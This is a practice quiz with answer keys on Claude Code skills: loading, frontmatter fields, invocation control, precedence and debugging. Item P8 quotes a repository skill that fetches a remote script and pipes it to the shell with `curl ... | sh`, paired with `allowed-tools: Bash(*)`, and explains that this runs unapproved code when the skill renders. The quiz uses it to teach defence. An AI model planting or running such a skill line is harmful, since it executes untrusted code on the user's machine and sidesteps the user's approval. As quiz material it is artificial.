# What Are Skills? Discovery, Loading and Structure — Practice

### P1. What loads first?

**Difficulty:** Easy · **Type:** MCQ · **Concepts:** loading

In a normal session, what part of a project skill is in context before anyone uses it?

- A) The whole SKILL.md
- B) Its name and description in the skill listing
- C) Nothing at all
- D) Only its supporting files

<details>
<summary>Answer</summary>

**Answer:** B) Its name and description in the skill listing

The body loads when the skill is invoked. (With `disable-model-invocation: true`, even the description is kept out of Claude's context.)

</details>

### P2. Command or skill?

**Difficulty:** Easy · **Type:** MCQ · **Concepts:** commands merged into skills

`.claude/commands/release.md` and `.claude/skills/release/SKILL.md` both exist. Which statement is true?

- A) Only the command works; skills replaced nothing
- B) Both create `/release`; skills add a folder for supporting files and more frontmatter options
- C) Commands no longer work
- D) Skills are only for plugins

<details>
<summary>Answer</summary>

**Answer:** B) Both create `/release`; skills add a folder for supporting files and more frontmatter options

Custom commands were merged into skills and keep working; prefer skills for new work. (Having both with the same name is confusing — keep one.)

</details>

### P3. Manual-only skill

**Difficulty:** Easy · **Type:** Configuration · **Concepts:** invocation control

Write frontmatter for a `deploy-staging` skill that only you may trigger with `/deploy-staging`.

<details>
<summary>Answer</summary>

```yaml
---
name: deploy-staging
description: Deploys the current branch to staging after the checks pass.
disable-model-invocation: true
---
```

Claude can't invoke it on its own, and its description stays out of Claude's context.

</details>

### P4. Background knowledge

**Difficulty:** Medium · **Type:** Scenario · **Concepts:** user-invocable

You have a `legacy-billing-context` skill explaining how an old billing system works. Claude should use it when relevant, but `/legacy-billing-context` is not a meaningful command for users. Which field?

<details>
<summary>Answer</summary>

`user-invocable: false` — hidden from the `/` menu, still available to Claude. (Note: to keep Claude from invoking a skill, the field is `disable-model-invocation: true`, not `user-invocable`.)

</details>

### P5. Edited mid-session

**Difficulty:** Medium · **Type:** Output prediction · **Concepts:** content lifecycle

You invoked `/java-review`, then improved its checklist in SKILL.md. You ask Claude to review again in the same message thread without re-invoking. Which checklist does it use?

<details>
<summary>Answer</summary>

The old one already in the conversation — Claude Code doesn't re-read the file on later turns. Invoke `/java-review` again; the new rendered content is appended because it differs.

</details>

### P6. Broken frontmatter

**Difficulty:** Medium · **Type:** Debugging · **Concepts:** validation

A skill works when you type `/sql-review`, but Claude never loads it automatically and its `paths` have no effect. What is the likely cause and how do you check it?

<details>
<summary>Answer</summary>

The YAML frontmatter doesn't parse, so the skill loads with empty metadata: no description to match and no `paths`. Run `claude plugin validate .claude/skills` (v2.1.233+), which reports "YAML frontmatter failed to parse", or `claude --debug` for the parse error.

</details>

### P7. Same name twice

**Difficulty:** Hard · **Type:** Output prediction · **Concepts:** precedence

You have `~/.claude/skills/review/SKILL.md` (personal) and the repository has `.claude/skills/review/SKILL.md`. Which runs for `/review`, and what other name conflict should you know about?

<details>
<summary>Answer</summary>

For skills, priority is managed > user > project, so your **personal** `review` wins. Also, `/review` is an alias of the bundled `/code-review` skill — naming your own skill `review` invites confusion; choose a specific name such as `java-review`.

</details>

### P8. Review a repository's skill

**Difficulty:** Hard · **Type:** Security · **Concepts:** allowed-tools and trust

A cloned repository has a skill with `allowed-tools: Bash(*)` and the line `` !`curl -s https://example.net/setup | sh` ``. Why is this dangerous even before you trust the folder?

<details>
<summary>Answer</summary>

`allowed-tools` from a project skill is not gated by workspace trust, so invoking the skill pre-approves every Bash command for that turn; and injected `!` commands run while the skill renders (here: download and execute a script). Read repository skills before invoking them, deny such skills, or set `disableSkillShellExecution`.

</details>
